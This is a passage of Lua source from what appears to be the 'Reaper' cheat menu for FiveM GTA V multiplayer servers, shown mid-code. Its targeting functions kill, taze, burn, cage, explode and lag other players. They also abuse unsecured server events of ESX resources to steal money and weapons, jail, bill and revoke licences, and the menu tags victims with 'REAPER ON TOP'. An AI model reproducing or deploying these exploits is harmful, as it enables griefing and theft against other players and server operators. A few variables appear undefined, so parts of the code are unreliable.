                    __REAPER1__.T.Display['server:targetinglist'] = { {text = 'Targeted players', dkey = 'server:targetinglist:targetedplayers', desc = 'Targeted players menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:targetedplayers'}, lasto = 1, scrollo = 0, addedo = 0}}
                end
            end,
            kill = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                            if p4 == 1 then
                                local coords = __REAPER1__.N.GetEntityCoords(ped)
                                __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 100.0, true, `WEAPON_PISTOL`, __REAPER1__.V.SelfPed, false, true, 999999999, false, false, 0)
                            else
                                local coords = __REAPER1__.N.GetEntityCoords(ped)
                                local sped =  __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('mp_m_freemode_01'--[[UDP]]), `mp_m_freemode_01`--[[UDP]], coords.x, coords.y, coords.z - 50.0, 0.0, true, true)
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 100.0, true, `WEAPON_PISTOL`, sped, false, true, 999999999, false, false, 0)
                                __REAPER1__.N.DeleteEntity(sped)
                            end

                            __REAPER26__(0)
                        end
                    end
                end)
            end,
            taze = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                            local coords = __REAPER1__.N.GetEntityCoords(ped)
                            local sped =  __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('mp_m_freemode_01'--[[UDP]]), `mp_m_freemode_01`--[[UDP]], coords.x, coords.y, coords.z - 50.0, 0.0, true, true)
                            __REAPER1__.N.ShootSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 0.0, true, `WEAPON_STUNGUN`, sped, false, true, 999999999, false, false, 0)
                            __REAPER1__.N.DeleteEntity(sped)

                            __REAPER26__(0)
                        end
                    end
                end)
            end,
            burn = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        for i = 1, 50 do
                            local coords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra)), 0.0, 1.0, 0.0)
                            __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                            num = num + 1
                        end

                        __REAPER26__(500)
                    end
                end)
            end,
            cage = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local pid = __REAPER1__.N.GetPlayerFromServerId(v.extra)
                        local ped = __REAPER1__.N.GetPlayerPed(pid)
                        if p2 then
                            if __REAPER1__.F.RequestEntity(`prop_facgate_02_l`) then
                                local head = __REAPER1__.N.GetEntityHeading(ped)
                                __REAPER1__.T.Cage[pid .. 'obj1'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, 0.5, -1.0), true, true, false)
                                __REAPER1__.T.Cage[pid .. 'obj2'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, -1.0, -1.0), true, true, false)
                                __REAPER1__.T.Cage[pid .. 'obj3'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, 0.4, -1.0, -1.0), true, true, false)
                                __REAPER1__.T.Cage[pid .. 'obj4'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, -0.5, -1.0), true, true, false)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[pid .. 'obj1'], 0.0, 0.0, head, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[pid .. 'obj2'], 0.0, 0.0, head + 90, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[pid .. 'obj3'], 0.0, 0.0, head + 90, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[pid .. 'obj4'], 0.0, 0.0, head, 1, true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[pid .. 'obj1'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[pid .. 'obj2'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[pid .. 'obj3'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[pid .. 'obj4'], true)
                            end
                        else
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[pid .. 'obj1'])
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[pid .. 'obj2'])
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[pid .. 'obj3'])
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[pid .. 'obj4'])
                            __REAPER1__.T.Cage[pida .. 'obj1'], __REAPER1__.T.Cage[pid .. 'obj2'], __REAPER1__.T.Cage[pid .. 'obj3'], __REAPER1__.T.Cage[pid .. 'obj4'] = nil, nil, nil, nil
                        end

                        __REAPER26__(5)
                    end
                end)
            end,
            demigod = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local pid = __REAPER1__.N.GetPlayerFromServerId(v.extra)
                        local ped = __REAPER1__.N.GetPlayerPed(pid)
                        if not p2 then
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.PlyDemigod[pid])
                            __REAPER1__.T.PlyDemigod[pid] = nil
                        else
                            if __REAPER1__.F.RequestEntity(`prop_juicestand`) then
                                __REAPER1__.T.PlyDemigod[pid] = __REAPER1__.N.CreateObject(`prop_juicestand`, __REAPER1__.N.GetEntityCoords(ped), true, true, false)
                                __REAPER1__.N.AttachEntityToEntity(__REAPER1__.T.PlyDemigod[pid], ped, __REAPER1__.N.GetPedBoneIndex(ped, 57005), 0, 0, 0, 0, 0, 0, false, false, false, true, 1, true)
                                __REAPER1__.N.SetEntityProofs(__REAPER1__.T.PlyDemigod[pid], true, true, true, true, true, true, true, false)
                                __REAPER1__.N.SetEntityVisible(__REAPER1__.T.PlyDemigod[pid], false)
                            end
                        end

                        __REAPER26__(5)
                    end
                end)
            end,
            alpha = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        __REAPER1__.N.SetEntityAlpha(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra)), p2[p4], false)
                    end
                end)
            end,
            clone = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                        __REAPER1__.N.ClonePed(ped, __REAPER1__.N.GetEntityHeading(ped), true, true)
                    end
                end)
            end,
            attackc = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                        for i = 1, math.random(2, 5) do
                            local clone = __REAPER1__.N.ClonePed(ped, __REAPER1__.N.GetEntityHeading(ped), true, true)
                            __REAPER1__.N.GiveWeaponToPed(clone, `WEAPON_KNIFE` , 9999, false, true)
                            __REAPER1__.N.TaskCombatPed(clone, ped, 0, 16)
                        end

                        __REAPER26__(5)
                    end
                end)
            end,
            attacks = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                        if __REAPER1__.F.RequestEntity(`s_m_y_swat_01`) then
                            for i = 1, math.random(2, 5) do
                                local swat = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('s_m_y_swat_01'), `s_m_y_swat_01`, __REAPER1__.N.GetEntityCoords(ped), __REAPER1__.N.GetEntityHeading(ped), true, true)
                                __REAPER1__.N.GiveWeaponToPed(swat, `WEAPON_CARBINERIFLE` , 9999, false, true)
                                __REAPER1__.N.TaskCombatPed(swat, ped, 0, 16)
                            end
                        end

                        __REAPER26__(5)
                    end
                end)
            end,
            bodyg = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                        if __REAPER1__.F.RequestEntity(`ig_fbisuit_01`) then
                            __REAPER1__.N.SetPedAsGroupLeader(ped, __REAPER1__.N.GetPlayerGroup(ped))
                            for i = 1, math.random(2, 5) do
                                local bodyg = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('ig_fbisuit_01'), `ig_fbisuit_01`, __REAPER1__.N.GetEntityCoords(ped), __REAPER1__.N.GetEntityHeading(ped), true, true)
                                __REAPER1__.N.GiveWeaponToPed(bodyg, `WEAPON_COMPACTRIFLE` , 9999, false, true)
                                __REAPER1__.N.SetPedAsGroupMember(bodyg, __REAPER1__.N.GetPlayerGroup(ped))
                                __REAPER1__.N.SetPedNeverLeavesGroup(bodyg, true)
                                __REAPER1__.N.SetCanAttackFriendly(bodyg, false, false)
                                __REAPER1__.N.TaskFollowToOffsetOfEntity(bodyg, ped, 0.0, 0.0, 0.0, 30.0, -1, 50.0, 1)
                            end
                        end

                        __REAPER26__(5)
                    end
                end)
            end,
            vehtome = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                        if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                            local entity =__REAPER1__.N.GetVehiclePedIsIn(ped, false)
                            if __REAPER1__.F.NetControl(entity) then
                                __REAPER1__.N.SetEntityCoordsNoOffset(entity, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true ,true)
                            end
                        end
                    end
                end)
            end,
            exploits = {
                bugveh = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 then
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestEntity(`prop_cigar_02`) then
                                for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                                    local ent = __REAPER1__.N.CreateObject(`prop_cigar_02`, __REAPER1__.N.GetEntityCoords(ped), true, true)
                                    __REAPER1__.N.AttachEntityToEntity(ent, ped, 0, 0, 0, 0, 0, 0, 0, false, false, true, false, 0, true)
                                    table.insert(__REAPER1__.T.BugvehTargetedplys, ent)
            
                                    __REAPER26__(5)
                                end
                            end
                        end)
                    else
                        for k,v in ipairs(__REAPER1__.T.BugvehTargetedplys) do
                            __REAPER1__.N.DeleteEntity(v)
                        end
                        __REAPER1__.T.BugvehTargetedplys = {}
                    end
                end,
                cleanup = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.T.LagTargetedPlys[1] then
                        for k,v in ipairs(__REAPER1__.T.LagTargetedPlys) do
                            __REAPER1__.N.DeleteEntity(v)
                        end
            
                        __REAPER1__.T.LagTargetedPlys = {}
            
                        __REAPER1__.F.AddNotification('Cleaned up vehicles.', 3000, 200, 200, 200)
                    end
                end,
                lag = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(p6) then
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                                for i = 1, __REAPER1__.A['server:targetinglist:exploits_lagamount'].sindex do
                                    local ent = __REAPER1__.N.CreateObject(p6, __REAPER1__.N.GetEntityCoords(ped), true, true)
                                    table.insert(__REAPER1__.T.LagTargetedPlys, ent)
            
                                    __REAPER26__(5)
                                end
            
                                __REAPER26__(5)
                            end
                        end
                    end)
                end
            },
            explosion = {
                explode = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))), __REAPER1__.A['server:targetinglist:explosion_type'].sindex - 1, __REAPER1__.F.IntToFloat(__REAPER1__.A['server:targetinglist:explosion_damage'].sindex - 1), __REAPER1__.A['server:targetinglist:explosion_audible'].func, __REAPER1__.A['server:targetinglist:explosion_invisible'].func, true)
                        end
                    end)
                end,
            },
            vehicle = {
                deletevehicle = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.DeleteEntity, 5, true)
                end,
                launchveh = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.ApplyForceToEntity, 5, 1, 0, 0, __REAPER1__.F.IntToFloat(p4 * 1000), 1.0, 0.0, 0.0, 1, false, true, false, false)
                end,
                removewheels = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.RemoveWheel, 5)
                end,
                setspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.SetVehicleForwardSpeed, 5, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                end,
                cloneveh = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                                __REAPER1__.N.CloneVehicle(veh, __REAPER1__.N.GetEntityCoords(veh), __REAPER1__.N.GetEntityHeading(veh), true, true)
                            end
                
                            __REAPER26__(0)
                        end
                    end)
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.FreezeEntityPosition, 5, p2)
                end,
                fuckup = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.FuckUpVeh, 5)
                end,
                tune = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.TuneVehicle, 5)
                end,
                downgrade = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.DowngradeVeh, 5)
                end,
                fix = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.FixVehicle, 5)
                end,
                randomize = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.RandomizeVehLook, 5)
                end,
                fuel = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                                if __REAPER1__.F.NetControl(veh) then
                                    if __REAPER1__.N.DecorExistOn(veh, "_FUEL_LEVEL") then
                                        __REAPER1__.N.DecorSetFloat(veh, "_FUEL_LEVEL", __REAPER1__.F.IntToFloat(p4 - 1))
                                    end
                                    __REAPER1__.N.SetVehicleFuelLevel(veh, __REAPER1__.F.IntToFloat(p4 - 1))
                                end
                            end
                        end
                    end)
                end,
                lock = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                                if __REAPER1__.F.NetControl(veh) then
                                    local lock = __REAPER1__.N.GetVehicleDoorLockStatus(veh)
                                    if lock == 0 or lock == 1 then
                                        __REAPER1__.N.OpDoorLock(veh, 2)
                                    elseif lock == 2 then
                                        __REAPER1__.N.OpDoorLock(veh, 1)
                                    end
                                end
                            end
                        end
                    end)
                end,
                open = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.SetVehicleDoorOpen, 0, p4 - 1, false, false)
                end,
                close = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.SetVehicleDoorShut, 0, p4 - 1, false)
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('target', __REAPER1__.N.SetVehicleDoorBroken, 0, p4 - 1, true)
                end,
                flip = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                                if __REAPER1__.F.NetControl(veh) then
                                    __REAPER1__.N.SetEntityRotation(veh, 0, 180.0, __REAPER1__.N.GetEntityHeading(veh), 1, true)
                                end
                            end
                        end
                    end)
                end,
            },
            weapon = {
                give = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            __REAPER1__.N.GiveWeaponToPed(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra)), p2[p4] == 'Parachute' and `GADGET_PARACHUTE` or __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4]), __REAPER1__.A['server:targetinglist:weapon_ammo'].sindex - 1, false, false)
                            __REAPER26__(5)
                        end
                    end)
                end,
                spawn = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local p = __REAPER1__.N.CreatePickup(p2[p4] == 'Parachute' and `PICKUP_PARACHUTE` or __REAPER1__.N.GetHashKey('PICKUP_WEAPON_' .. p2[p4]), __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(v.extra)))
                            __REAPER26__(3000)
                            __REAPER1__.N.RemovePickup(p)
                        end
                    end)
                end,
                remove = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                            local weapon = p2[p4] == 'Parachute' and `GADGET_PARACHUTE` or __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4])
                            __REAPER1__.N.RemoveWeaponFromPed(ped, weapon)
                            __REAPER1__.N.SetPedAmmo(ped, weapon, __REAPER1__.A['server:targetinglist:weapon_ammo'].sindex - 1)
                        end

                        __REAPER26__(5)
                    end)
                end,
                removec = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                            local jelenlegiFegyoBool, jelenlegiFegyo = __REAPER1__.N.GetCurrentPedWeapon(ped, 1)
                            if jelenlegiFegyoBool then
                                __REAPER1__.N.RemoveWeaponFromPed(ped, jelenlegiFegyo)
                                __REAPER1__.N.SetPedAmmo(ped, weapon, __REAPER1__.A['server:targetinglist:weapon_ammo'].sindex - 1)
                            end

                            __REAPER26__(5)
                        end
                    end)
                end,
                itracer = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.T.TlistPlysTracerI = {}
                end,
                btracer = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.T.TlistPlysTracerB = {}
                end,
            },
            sound = {
                sound = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra)))
                            __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[__REAPER1__.A['server:targetinglist:sound_type'].sindex].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[__REAPER1__.A['server:targetinglist:sound_type'].sindex].dict, true, 1.0, true)

                            __REAPER26__(5)
                        end
                    end)
                end,
            },
            trigger = {
                anim = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('dpemotes') == 'started' then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent('ServerValidEmote', v.extra, __REAPER1__.T.TriggerAnims[p4], '')

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                stealm = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerSteal then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerSteal, v.extra, __REAPER1__.N.GetPlayerServerId(__REAPER1__.V.SelfPlayerId), 'item_money', '', p2)
                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerSteal = __REAPER1__.F.DynamicTrigger('esx_inventoryhud', 'TriggerServerEvent', 'TakeFromPlayer')
                    end
                end,
                stealwep = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerSteal then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerSteal, v.extra, __REAPER1__.N.GetPlayerServerId(__REAPER1__.V.SelfPlayerId), 'item_weapon', '', p2)
                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerSteal = __REAPER1__.F.DynamicTrigger('esx_inventoryhud', 'TriggerServerEvent', 'TakeFromPlayer')
                    end
                end,
                jail = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerJail then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerJail, v.extra, p2[p4], '\n\n   ???^7^*REAPER ON TOP   \n\n')

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerJail = __REAPER1__.F.DynamicTrigger('esx-qalle-jail', 'TriggerServerEvent', 'GetPlayerServerId%(')
                    end
                end,
                bill = function(p1, p2, p3, p4, p5, p6, p7)
                    local bill = __REAPER1__.F.StringSplit(p2, ' ')
                    if __REAPER1__.V.TriggerBill then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerBill, v.extra, '', bill[1], tonumber(bill[2]))

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerBill = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', 'society_police')
                    end
                end,
                commserv = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('esx_communityservice') == 'started' then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent('esx_communityservice:sendToCommunityService', v.extra, tonumber(p4))

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                rcommserv = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('esx_communityservice') == 'started' then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent('esx_communityservice:endCommunityServiceCommand', v.extra)

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                message = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerMsg then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerMsg, v.extra, p4)

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerMsg = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', "license_revoked")
                    end
                end,
                carry = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerCarry then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                if p1 == 'Default' then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, v.extra, 100000, 0.0, 49, 33, 1)
                                elseif p1 == 'Secks' then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'rcmpaparazzo_2', 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', 0.0, 0.0, 0.0, v.extra, 100000, 0.0, 49, 33, 1)
                                elseif p1 == 'Fucked' then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, v.extra, 100000, 0.0, 256, 256, 1)
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerCarry = __REAPER1__.F.DynamicTrigger('CarryPeople', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                th = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerTakeHostage then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                if p1 == 'Default' then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, v.extra, 100000, 0.0, 49, 49, 50, true)
                                elseif p1 == 'Secks' then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'rcmpaparazzo_2', 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', 0.11, -0.24, 0.0, v.extra, 100000, 0.0, 49, 49, 50, true)
                                elseif p1 == 'Fucked' then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, v.extra, 100000, 0.0, 256, 256, 256, true)
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerTakeHostage = __REAPER1__.F.DynamicTrigger('TakeHostage', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                piggyback = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerPiggyback then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                if p1 == 'Default' then
